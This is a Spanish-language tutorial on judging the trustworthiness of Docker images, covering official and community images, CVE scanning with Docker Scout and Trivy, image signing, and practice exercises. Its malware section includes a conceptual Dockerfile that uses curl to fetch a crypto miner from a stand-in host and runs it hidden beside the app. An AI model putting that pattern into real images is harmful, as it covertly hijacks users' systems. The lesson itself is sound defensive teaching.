# T04 — Imágenes de confianza

## El riesgo de las imágenes

Una imagen Docker es **código ejecutable empaquetado**. Cuando ejecutas
`docker run some_image`, estás ejecutando código de un tercero con los permisos del
contenedor (por defecto root). Si la imagen contiene malware, se ejecuta en tu
sistema.

```
docker pull usuario_desconocido/app-util:latest
                        │
                        ▼
           ┌─────────────────────────┐
           │  ¿Qué hay dentro?       │
           │                         │
           │  ✓ La aplicación        │
           │  ? Crypto miner         │
           │  ? Backdoor             │
           │  ? CVEs sin parchear    │
           │  ? Credenciales         │
           │    hardcodeadas         │
           │  ? Paquetes obsoletos   │
           └─────────────────────────┘
```

Cada capa de la imagen puede contener código malicioso o vulnerable. No importa
si la aplicación principal es legítima — las capas base o las dependencias pueden
ser el vector de ataque.

## Tipos de imágenes en Docker Hub

### Imágenes oficiales (`library/`)

Mantenidas por Docker Inc. en colaboración con los autores del software. Se
identifican por no tener prefijo de usuario/organización:

```bash
# Imágenes oficiales — sin prefijo
docker pull nginx          # library/nginx
docker pull postgres       # library/postgres
docker pull alpine         # library/alpine
docker pull python         # library/python
docker pull debian         # library/debian
docker pull redis          # library/redis
```

Características:

| Aspecto | Detalle |
|---------|---------|
| Revisadas | Escaneadas por Docker Inc. en cada push |
| Documentación | Mejores prácticas, configuración recomendada |
| Actualizaciones | Regulares (security patches rápidos) |
| Dockerfiles | Públicos y auditables en GitHub |
| Variantes | slim (menos paquetes), alpine (muy pequeña), bookworm (Debian 12) |
| Soporte multi-arch | amd64, arm64, arm/v7 |
| Badge | "Official Image" en Docker Hub |

### Imágenes verificadas (Verified Publisher)

De empresas que Docker ha verificado como legítimas. Tienen un badge de
"Verified Publisher" en Docker Hub:

```bash
# Imágenes de publishers verificados — con prefijo de organización
docker pull bitnami/postgresql    # VMware/Bitnami
docker pull grafana/grafana       # Grafana Labs
docker pull hashicorp/vault       # HashiCorp
docker pull elastic/elasticsearch # Elastic
```

Criterios de verificación:

- La empresa es validada por Docker
- La imagen es mantenida activamente por la empresa
- Dockerfiles públicos o reviews de seguridad
- Compromiso con actualizaciones de seguridad

### Imágenes community

Publicadas por cualquier usuario. **Sin garantía de calidad ni seguridad**:

```bash
# Imágenes community — usuario/imagen
docker pull random_user/some_tool
docker pull hacker123/cool_tool
docker pull unknown134/myapp

# ¿Quién es random_user?
# ¿El Dockerfile es público?
# ¿Cuándo se actualizó?
# ¿Hay malware en las capas?
```

### Comparación

| Tipo | Confianza | Actualizaciones | Auditoría | Ejemplo |
|---|---|---|---|---|
| Official (library/) | Alta | Regulares, automatizadas | Docker Inc. + upstream | `nginx`, `postgres`, `alpine` |
| Verified Publisher | Media-Alta | Depende del publisher | Publisher verificado por Docker | `bitnami/redis`, `grafana/grafana` |
| Community (user/image) | Variable | Sin garantía | Ninguna | `user123/tool` |

## Riesgos concretos de imágenes no confiables

### Malware embebido

Una imagen puede contener un crypto miner, un reverse shell, o un exfiltrador de
datos que se ejecuta silenciosamente junto con la aplicación legítima:

```dockerfile
# Dockerfile malicioso (ejemplo conceptual — NO ejecutar)
FROM node:20
COPY app/ /app/
# Carga útil oculta en una capa intermedia
RUN curl -s https://malware.example.com/miner -o /usr/local/bin/.svc && \
    chmod +x /usr/local/bin/.svc
CMD ["/bin/sh", "-c", "/usr/local/bin/.svc & node /app/index.js"]
```

El miner corre en background mientras la aplicación funciona normalmente. Sin
monitoreo, no se detecta.

**Señales de alarma**:

- `docker history` muestra capas con URLs externas sospechosas
- El tamaño de la imagen es mucho mayor de lo esperado
- La imagen hace conexiones salientes a IPs desconocidas
- Procesos inesperados en segundo plano (`ps aux` dentro del contenedor)

### Dependencias con vulnerabilidades (CVEs)

Imágenes con librerías desactualizadas contienen vulnerabilidades conocidas:

```bash
# Una imagen basada en una versión antigua puede tener cientos de CVEs
docker scout cves node:16
# CVE-2023-XXXX (CRITICAL): OpenSSL buffer overflow
# CVE-2023-YYYY (HIGH): libcurl HSTS bypass
# ... 150+ vulnerabilidades

# Versión actualizada tiene menos vulnerabilidades
docker scout cves node:20
# Critical    0
# High        1
# Medium      3
# Low         8
```

### Bases abandonadas

Imágenes que ya no se mantienen y no reciben parches:

```bash
# ¿Cuándo se actualizó esta imagen por última vez?
docker inspect --format '{{.Created}}' some_image:latest
# 2021-03-15T... — hace años, todas las dependencias están desactualizadas

# Señales de una imagen abandonada:
# - Último push hace más de 1 año
# - No hay variantes recientes (slim, alpine, etc.)
# - No hay updates de security
# - El repositorio GitHub está archived
```

### Credenciales hardcodeadas

Algunas imágenes contienen credenciales o secrets embebidos:

```bash
# Una imagen podría tener:
# - Claves SSH hardcodeadas
# - Credenciales de base de datos
# - Tokens de API
# - Keys de encryption

# Verificar variables de entorno sospechosas
docker run --rm some_image env | grep -iE "password|secret|key|token"

# Peligro: si la imagen es pública, cualquiera puede ver estos secrets
```

## Docker Scout — Escaneo de vulnerabilidades

Docker Scout (anteriormente `docker scan`) analiza las capas de una imagen y
compara las dependencias contra bases de datos de CVEs (NVD - National
Vulnerability Database):

```bash
# Escaneo rápido — resumen
docker scout quickview nginx:latest
# Target: nginx:latest
# digest: sha256:abc123...
#
#   Critical    0
#   High        2
#   Medium      5
#   Low         12
#   Unspecified 3
#
# Packages    87
# Base image  debian:bookworm-slim

# Listar CVEs detalladamente
docker scout cves nginx:latest
# CVE-2024-XXXX  HIGH   libcurl 7.88.1 → fix in 7.88.2
# CVE-2024-YYYY  MEDIUM openssl 3.0.9  → fix in 3.0.10
# ...

# Comparar dos versiones
docker scout compare --to nginx:1.25 nginx:1.24
# Muestra CVEs resueltas y nuevas entre versiones

# Ver solo CVEs de la imagen base
docker scout cves nginx:latest --only-base

# Ver solo CVEs con fix disponible
docker scout cves nginx:latest --only-fixed
```

> **Nota**: Docker Scout requiere autenticación con Docker Hub (`docker login`).
> En la versión gratuita hay límites de escaneos mensuales.

### Interpretar los resultados

No todas las CVEs requieren acción inmediata:

| Severidad | Significado | Acción |
|-----------|-------------|--------|
| **CRITICAL** | Remotamente exploitable, sin auth, impacto alto | Parchear inmediatamente |
| **HIGH** | Exploitable pero requiere condiciones específicas | Parchear pronto |
| **MEDIUM** | Puede no aplicar a tu caso de uso | Evaluar contexto |
| **LOW** | Riesgo bajo, difícil de explotar | Monitorear |
| **UNSPECIFIED** | Sin información de severidad | Investigar manualmente |

**Falsos positivos**: una CVE en OpenSSL puede no afectarte si tu aplicación no
usa las funciones vulnerables. Evalúa si la CVE es **explotable en tu contexto**
antes de actuar.

**En CI/CD**:

```bash
# Solo fallar si hay CRITICAL o HIGH
docker scout cves myapp:v1 --exit-code --only-severity critical,high
# Exit code != 0 si hay CVEs de esa severidad → rompe el pipeline
```

### Alternativa: Trivy

Trivy (de Aqua Security) es un escáner open-source muy popular que no requiere
cuenta de Docker Hub:

```bash
# Instalar Trivy (Fedora)
sudo dnf install trivy

# Escanear una imagen
trivy image nginx:latest
# nginx:latest (debian 12.5)
# Total: 85 (CRITICAL: 0, HIGH: 3, MEDIUM: 12, LOW: 70)
#
# CVE-2024-XXXX  HIGH   libcurl  7.88.1  7.88.2  HSTS bypass
# ...

# Solo mostrar CVEs con fix disponible
trivy image --ignore-unfixed nginx:latest

# Escanear un Dockerfile (no necesita construir la imagen)
trivy config Dockerfile
```

Trivy también escanea filesystems, repositorios git, y configuraciones de
Kubernetes. Es la herramienta más usada en CI/CD open-source.

## Docker Content Trust (DCT)

DCT verifica que las imágenes estén **firmadas** por su publicador. Cuando está
activo, Docker rechaza imágenes sin firma válida:

```bash
# Activar Content Trust
export DOCKER_CONTENT_TRUST=1

# Pull de una imagen firmada — funciona
docker pull nginx:latest
# Pull (1 of 1): nginx:latest@sha256:...
# Tagging nginx:latest@sha256:... as nginx:latest

# Pull de una imagen sin firmar — falla
docker pull random_user/unsigned_image:latest
# Error: remote trust data does not exist
# No valid trust data for latest
```

### Cómo funciona DCT

```
Publisher pushes image
        │
        ▼
   [Notary Server]
   Firma con clave privada
        │
        ▼
   Imagen + firma almacenada
        │
        │
Consumer pulls image
        │
        ▼
   [Notary Server]
   Verifica firma con clave pública
        │
        ▼
   Imagen válida → se ejecuta
   Imagen no firmada → se rechaza
```

### Firmar imágenes

```bash
# Con Content Trust activo, push firma automáticamente
export DOCKER_CONTENT_TRUST=1
docker login

docker push myuser/myapp:v1
# Signing and pushing trust data
# Enter passphrase for root key: ********
# Enter passphrase for repository key: ********

# Ver información de firma de una imagen
docker trust inspect nginx
# Signers:
#   - docker-library  (key: abc123...)
# Administrative keys:
#   - Repository Key: def456...
```

### Limitaciones de DCT

- Requiere que el publisher firme sus imágenes (muchas community no lo hacen)
- Si pierdes la clave raíz, no puedes actualizar las firmas
- DCT verifica **procedencia** (quién publicó), no **contenido** (qué hay dentro)
- No se puede activar globalmente si dependes de imágenes community sin firmar
- Puede activarse selectivamente por repositorio

## Buenas prácticas

### 1. Usar imágenes oficiales como base

```dockerfile
# Bien: imagen oficial, versión específica
FROM python:3.12-slim-bookworm

# Evitar: imagen community de origen desconocido
# FROM random_user/python-custom:latest
```

### 2. Especificar versiones exactas (nunca `latest`)

```bash
# Mal: latest puede cambiar en cualquier momento
docker pull nginx:latest

# Bien: versión específica
docker pull nginx:1.25.4

# Mejor: digest (inmutable, reproducibilidad garantizada)
docker pull nginx@sha256:abc123def456...
```

La etiqueta `latest` no significa "la más reciente" — es simplemente la etiqueta
por defecto. El mantenedor puede apuntar `latest` a cualquier versión, y puede
cambiar sin aviso.

### 3. Usar digest para reproducibilidad

```bash
# Obtener digest de una imagen
docker inspect --format '{{index .RepoDigests 0}}' nginx:latest
# nginx@sha256:abc123...

# Usar digest en Dockerfile garantiza la misma imagen siempre
# FROM nginx@sha256:abc123...

# Un tag puede apuntar a imágenes diferentes con el tiempo
# Un digest es inmutable — siempre la misma imagen
```

### 4. Escanear regularmente

```bash
# Con Docker Scout
docker scout cves myimage:v1.2.3 --exit-code --only-severity critical,high

# Con Trivy
trivy image --severity CRITICAL,HIGH myimage:v1.2.3

# Integrar en CI/CD para bloquear deploys con CVEs críticas
```

### 5. Reconstruir periódicamente

Las dependencias de la imagen base se parchean continuamente. Reconstruir la
imagen incorpora los parches más recientes:

```bash
# Reconstruir sin caché para obtener las dependencias más recientes
docker build --no-cache -t myapp:v1.2.3 .

# Programar rebuilds automáticos:
# - Usar Renovate/Dependabot para detectar updates de imagen base
# - Rebuild automático en CI/CD cuando la base se actualiza
```

### 6. Minimizar la superficie de ataque

```dockerfile
# Usar imágenes mínimas
FROM python:3.12-slim-bookworm  # En lugar de python:3.12 (full)

# Multi-stage build — copiar solo lo necesario
FROM python:3.12 AS builder
COPY requirements.txt .
RUN pip install --target=/install -r requirements.txt

FROM python:3.12-slim-bookworm
COPY --from=builder /install /usr/local/lib/python3.12/site-packages
COPY app/ /app/
USER appuser
CMD ["python", "/app/main.py"]
```

Menos paquetes = menos CVEs potenciales = menor superficie de ataque.

#### Jerarquía de imágenes base por tamaño

| Imagen base | Tamaño aprox. | Contenido | Uso típico |
|---|---|---|---|
| `python:3.12` (full) | ~900 MB | Debian completo + build tools | Desarrollo |
| `python:3.12-slim` | ~150 MB | Debian mínimo | Producción (mayoría) |
| `python:3.12-alpine` | ~50 MB | Alpine Linux (musl libc) | Producción (si compatible) |
| `gcr.io/distroless/python3` | ~50 MB | Solo runtime, sin shell | Producción (máxima seguridad) |
| `scratch` | 0 MB | Vacía | Binarios estáticos (Go, Rust) |

> **Nota sobre Alpine**: usa `musl` en lugar de `glibc`. Algunas librerías de
> Python con extensiones C pueden no compilar o funcionar diferente. Probar
> antes de usar en producción.

> **Nota sobre distroless**: no tiene shell, package manager ni utilidades. No
> puedes hacer `docker exec ... sh`. Máxima seguridad pero difícil de debuggear.

### 7. Verificar el Dockerfile

Antes de usar una imagen community, verifica que el Dockerfile esté disponible:

```
Docker Hub → imagen → "Dockerfile" tab
GitHub → repositorio del mantenedor → Dockerfile

Si no hay Dockerfile público → no confíes en la imagen
```

**Preguntas a responder**:

- ¿El Dockerfile es público y auditable?
- ¿Las capas tienen comandos sospechosos (curl a URLs externas, wget sin verificación)?
- ¿El tamaño de la imagen es razonable para lo que hace?
- ¿Hay un mantenedor activo? ¿Cuándo fue el último update?

### 8. Auditar periódicamente

```bash
# Revisar qué imágenes tienes localmente
docker images

# Auditar capas de una imagen
docker history nginx:latest

# Verificar que no hay secrets en la imagen
docker run --rm nginx:latest env | grep -iE "password|secret|key|token"
```

## Integración con CI/CD

```yaml
# GitHub Actions — ejemplo
- name: Scan image for vulnerabilities
  uses: docker/scout-action@v1
  with:
    image: myregistry/myapp:${{ github.sha }}
    only-severity: critical,high
    fail: true
```

```bash
# Script de CI genérico
# 1. Build
docker build -t myapp:$TAG .

# 2. Escaneo (falla si hay CRITICAL/HIGH)
docker scout cves myapp:$TAG --exit-code --only-severity critical,high

# 3. Push solo si pasa el scan
docker push myapp:$TAG
```

## Herramientas de seguridad comparadas

| Herramienta | Qué hace | Cuándo usarla |
|---|---|---|
| `docker scout cves` | Escanea CVEs en dependencias | Antes de deploy, en CI/CD |
| `docker scout quickview` | Resumen rápido de seguridad | Evaluación rápida |
| `docker scout compare` | Compara CVEs entre versiones | Planificar updates |
| `docker trust inspect` | Verifica firmas de imágenes | Validar origen |
| `DOCKER_CONTENT_TRUST=1` | Rechaza imágenes sin firmar | Entornos restringidos |
| `docker history` | Ver capas y comandos de la imagen | Auditar qué se instaló |
| `docker inspect` | Metadata completa de la imagen | Verificar USER, EXPOSE, etc. |
| `trivy image` | Escáner open-source de CVEs | CI/CD sin cuenta Docker Hub |

## Tabla resumen de confianza por tipo de imagen

| Criterio | Official | Verified Publisher | Community |
|----------|----------|-------------------|-----------|
| Identificación | Sin prefijo (`nginx`) | Prefijo organización + badge | Prefijo usuario |
| Mantenedor | Docker + upstream | Empresa verificada | Cualquiera |
| Dockerfile público | Sí | Generalmente | Puede no estar |
| Escaneo automático | Sí | Sí | No |
| Actualizaciones security | Rápidas | Depende del publisher | No garantizado |
| Multi-arquitectura | Sí | Generalmente | Raro |
| Firmas (DCT) | Sí | Generalmente | Raro |

---

## Práctica

### Ejercicio 1 — Escanear vulnerabilidades

```bash
# Escanear una imagen mínima
docker scout quickview alpine:latest
# Debería tener muy pocas o ninguna CVE

# Escanear una imagen más completa
docker scout quickview nginx:latest
# Más paquetes → más CVEs potenciales

# Ver detalles de las CVEs critical/high de nginx
docker scout cves nginx:latest --only-severity critical,high 2>&1 | head -30

# Ver CVEs con fix disponible
docker scout cves nginx:latest --only-fixed 2>&1 | head -20
```

**Predicción**: alpine tiene pocas o cero CVEs (imagen mínima, ~7 MB). nginx,
basada en Debian, tiene más CVEs por incluir más paquetes. Las CVEs con fix
disponible son las que deberías priorizar.

### Ejercicio 2 — Comparar imágenes full vs slim

```bash
# Descargar variantes de la misma imagen
docker pull python:3.12
docker pull python:3.12-slim

# Comparar tamaño
docker image ls python --format "table {{.Repository}}:{{.Tag}}\t{{.Size}}"
# python:3.12       ~900MB
# python:3.12-slim  ~150MB

# Comparar vulnerabilidades
docker scout quickview python:3.12
docker scout quickview python:3.12-slim
# La versión slim tiene significativamente menos CVEs

# Ver cuántos paquetes del sistema tiene cada una
docker run --rm python:3.12 dpkg -l | wc -l
docker run --rm python:3.12-slim dpkg -l | wc -l
```

**Predicción**: python:3.12 (full) incluye compiladores, headers y herramientas
de desarrollo — ~900 MB y muchas más CVEs. python:3.12-slim elimina todo lo
que no es necesario para ejecutar Python — ~150 MB y muchas menos CVEs. La
diferencia en paquetes del sistema (`dpkg -l`) será drástica.

### Ejercicio 3 — Auditar una imagen con `docker history`

```bash
# Ver los comandos que construyeron la imagen
docker history nginx:latest --no-trunc --format "{{.CreatedBy}}" | head -15

# Buscar URLs externas en los comandos de build
docker history nginx:latest --no-trunc | grep -iE "curl|wget|http"

# Ver el tamaño de cada capa
docker history nginx:latest --format "table {{.CreatedBy}}\t{{.Size}}" | head -10

# Verificar si la imagen define un USER non-root
docker inspect --format '{{.Config.User}}' nginx:latest
# "" (vacío) → corre como root por defecto
# (nginx hace drop de privilegios internamente: master=root, workers=nginx)

docker inspect --format '{{.Config.User}}' postgres:16
# "" → root al inicio, pero el entrypoint (docker-entrypoint.sh) cambia a postgres
```

**Predicción**: `docker history` muestra los comandos RUN/COPY/ADD de cada capa.
Tanto nginx como postgres muestran User vacío — arrancan como root pero
internamente bajan privilegios. Las URLs en las capas de nginx serán de
repositorios oficiales de Debian/nginx (legítimas).

### Ejercicio 4 — Docker Content Trust

```bash
# Activar Content Trust
export DOCKER_CONTENT_TRUST=1

# Pull de imagen oficial firmada
docker pull alpine:latest
# Funciona — las imágenes oficiales están firmadas

# Intentar pull de una imagen sin firmar
docker pull tulgeywood/test:latest 2>&1 || echo "DCT rechazó la imagen"
# Error: remote trust data does not exist
# (si la imagen existe pero no está firmada)

# Ver información de firma de una imagen oficial
docker trust inspect alpine 2>&1 | head -20
# Muestra los signers y las claves

# Desactivar para continuar con el laboratorio
unset DOCKER_CONTENT_TRUST

# Verificar que DCT está desactivado
echo "DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST"
# Vacío o no definido
```

**Predicción**: con DCT activo, alpine (firmada) se descarga normalmente.
Imágenes community sin firmar son rechazadas con error. `docker trust inspect`
muestra que alpine está firmada por `docker-library`.

### Ejercicio 5 — Tags vs Digests

```bash
# Descargar nginx y ver su digest
docker pull nginx:latest
docker inspect --format '{{index .RepoDigests 0}}' nginx:latest
# nginx@sha256:abc123...  (el digest real)

# El digest identifica la imagen de forma inmutable
# Si alguien modifica la imagen, el digest cambia

# Puedes usar el digest para descargar exactamente la misma imagen
# independientemente de a dónde apunte el tag "latest" en el futuro
DIGEST=$(docker inspect --format '{{index .RepoDigests 0}}' nginx:latest)
echo "Para reproducibilidad, usar: docker pull $DIGEST"

# Ver que diferentes tags pueden tener el mismo o diferente digest
docker pull nginx:mainline
docker inspect --format '{{index .RepoDigests 0}}' nginx:mainline
# Puede ser el mismo digest que latest (si mainline = latest)
```

**Predicción**: `nginx:latest` y `nginx:mainline` pueden apuntar a la misma imagen
(mismo digest). Esto demuestra que los tags son mutables — pueden cambiar. Los
digests son inmutables — siempre la misma imagen.

### Ejercicio 6 — Evaluar una imagen desconocida

```bash
# Proceso de evaluación antes de usar una imagen:

# 1. Ver el tamaño (imágenes sospechosamente grandes pueden tener extras)
docker pull bitnami/postgresql
docker images bitnami/postgresql --format "{{.Size}}"

# 2. Verificar quién la publica (¿Verified Publisher?)
# En Docker Hub: buscar "bitnami" → debería tener badge de Verified Publisher

# 3. Ver las capas y comandos de build
docker history bitnami/postgresql --no-trunc | head -10

# 4. Escanear vulnerabilidades
docker scout quickview bitnami/postgresql

# 5. Verificar si define un USER non-root
docker inspect --format '{{.Config.User}}' bitnami/postgresql
# bitnami/postgresql usa UID 1001 (non-root por defecto)

# 6. Buscar secrets en variables de entorno
docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' bitnami/postgresql

# Comparar con la imagen oficial
docker inspect --format '{{.Config.User}}' postgres:16
# "" → root (pero baja privilegios internamente)

# Limpiar
docker rmi bitnami/postgresql 2>/dev/null
```

**Predicción**: bitnami/postgresql es Verified Publisher (confiable). A
diferencia de la oficial, bitnami usa un usuario non-root por defecto (UID 1001).
Las capas no deberían tener URLs sospechosas. Las variables de entorno incluirán
configuración de PostgreSQL (no secrets reales).

### Ejercicio 7 — El tag `latest` no es lo que piensas

```bash
# Demostrar que "latest" es solo un nombre, no una promesa

# Ver la fecha de creación de la imagen latest
docker inspect --format '{{.Created}}' nginx:latest
# 2024-xx-xx  (puede o no ser la más reciente compilada)

# Listar los tags disponibles de una imagen oficial
# (Docker Hub API, sin autenticación)
docker manifest inspect nginx:latest 2>/dev/null | head -5
# Muestra la plataforma y digest del manifest

# Comparar la fecha de latest vs una versión específica
docker pull nginx:1.25
docker inspect --format '{{.Created}}' nginx:1.25

# "latest" puede incluso no existir para algunas imágenes
# No todas las imágenes definen un tag "latest"
```

**Predicción**: las fechas de `nginx:latest` y `nginx:1.25` pueden diferir.
`latest` no necesariamente apunta a la última versión compilada — es una
convención, no una garantía.

### Ejercicio 8 — Jerarquía de imágenes base

```bash
# Comparar tamaños de diferentes bases para la misma funcionalidad
docker pull alpine:latest
docker pull debian:bookworm-slim
docker pull debian:bookworm
docker pull ubuntu:24.04

# Ver tamaños
docker image ls --format "table {{.Repository}}:{{.Tag}}\t{{.Size}}" | \
  grep -E "^(alpine|debian|ubuntu)"
# alpine:latest          ~7MB
# debian:bookworm-slim   ~75MB
# debian:bookworm        ~140MB
# ubuntu:24.04           ~78MB

# Comparar paquetes instalados
docker run --rm alpine apk list --installed 2>/dev/null | wc -l
docker run --rm debian:bookworm-slim dpkg -l 2>/dev/null | wc -l
docker run --rm debian:bookworm dpkg -l 2>/dev/null | wc -l

# Escanear las tres y comparar CVEs
docker scout quickview alpine:latest
docker scout quickview debian:bookworm-slim
docker scout quickview debian:bookworm

# Limpiar
docker rmi alpine:latest debian:bookworm-slim debian:bookworm ubuntu:24.04 2>/dev/null
```

**Predicción**: alpine es la más pequeña (~7 MB, ~15 paquetes) con menos CVEs.
debian:bookworm-slim es intermedia (~75 MB). debian:bookworm (full) es la mayor
(~140 MB) con más paquetes y más CVEs. La relación es directa: más paquetes →
mayor superficie de ataque → más CVEs potenciales.
